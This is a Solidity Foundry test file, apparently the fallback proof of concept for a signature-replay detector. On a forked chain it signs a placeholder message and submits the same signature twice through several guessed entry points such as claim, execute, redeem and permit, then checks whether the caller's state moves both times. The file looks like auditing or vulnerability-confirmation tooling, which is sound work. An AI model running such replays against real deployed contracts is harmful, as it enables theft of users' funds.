// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Signature replay (no nonce / deadline / chain binding)
/// @notice Detector: signature-replay. The target verifies a signature
///         without a nonce, deadline, or chainId binding, so the SAME
///         signature can be submitted twice (or on another chain / another
///         contract using the same verifier) and accepted again.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The signed entry point is a guess, so
///      several are tried and the result is judged on the OBSERVABLE -- the
///      SAME signature moves the caller's state TWICE -- never on the bare
///      fact that a call returned.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // Test signer -- the target must trust signatures from this key's
    // address (e.g. the target's owner / authorized signer).
    uint256 public constant SIGNER_KEY = 0xA11CE;
    // TODO: the exact message the target expects to be signed.
    bytes32 public constant MESSAGE_HASH = bytes32(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _viewOrZero(string memory sig, address who) internal view returns (uint256) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(sig, who));
        if (ok && ret.length == 32) return abi.decode(ret, (uint256));
        return 0;
    }

    /// A fingerprint of the caller's value-bearing state: ETH plus whichever
    /// common balance view the target exposes. A replay must move THIS twice.
    function _readState(address who) internal view returns (uint256) {
        uint256 acc = who.balance;
        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("balanceOf(address)", who))));
        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("credits(address)", who))));
        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("balances(address)", who))));
        return acc;
    }

    /// Try one signed entry point and accept it only when the OBSERVABLE
    /// changes, never when the call merely returns: the SAME signature must
    /// move the caller's state on a SECOND, identical submission. A no-op
    /// returns successfully and moves nothing; a target with a nonce rejects
    /// the replay.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok1,) = target.call(data);
        if (!ok1) {
            console.log("tried", label, "first use reverted");
            return "";
        }
        uint256 mid = _readState(attacker);

        vm.prank(attacker);
        (bool ok2,) = target.call(data);
        console.log("tried", label, ok2 ? "replay returned" : "replay reverted");
        uint256 after_ = _readState(attacker);

        // OBSERVABLE: state moved on the first use AND moved AGAIN on the
        // identical second use.
        if (ok2 && mid != before && after_ != mid) return label;
        return "";
    }

    /// The signed entry point is a GUESS; try the plausible ones.
    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);
        bytes memory sig = abi.encodePacked(r, s, v);

        used = _attempt(attacker, before, "claim(bytes)", abi.encodeWithSignature("claim(bytes)", sig));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "execute(bytes)", abi.encodeWithSignature("execute(bytes)", sig));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "redeem(bytes)", abi.encodeWithSignature("redeem(bytes)", sig));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim(bytes32,bytes)", abi.encodeWithSignature("claim(bytes32,bytes)", MESSAGE_HASH, sig));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "execute(bytes32,bytes)", abi.encodeWithSignature("execute(bytes32,bytes)", MESSAGE_HASH, sig));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "claim(address,uint256,bytes)",
            abi.encodeWithSignature("claim(address,uint256,bytes)", attacker, 1 ether, sig)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            abi.encodeWithSignature(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
                vm.addr(SIGNER_KEY),
                attacker,
                type(uint256).max,
                block.timestamp + 1 days,
                v,
                r,
                s
            )
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _readState(attackerEOA);
        string memory used = _tryEntry(attackerEOA, before);
        console.log("signature-replay entry point that accepted the same signature twice:", used);

        assertTrue(
            bytes(used).length > 0,
            "no signature-replay entry point reproduced. Tried claim(bytes), execute(bytes), redeem(bytes), claim(bytes32,bytes), execute(bytes32,bytes), claim(address,uint256,bytes), permit(address,address,uint256,uint256,uint8,bytes32,bytes32) with the same signature submitted twice. This does NOT establish safety: the entry may have another name or signature, the digest/domain may differ from MESSAGE_HASH, or the signer may not be one the target trusts."
        );
    }
}
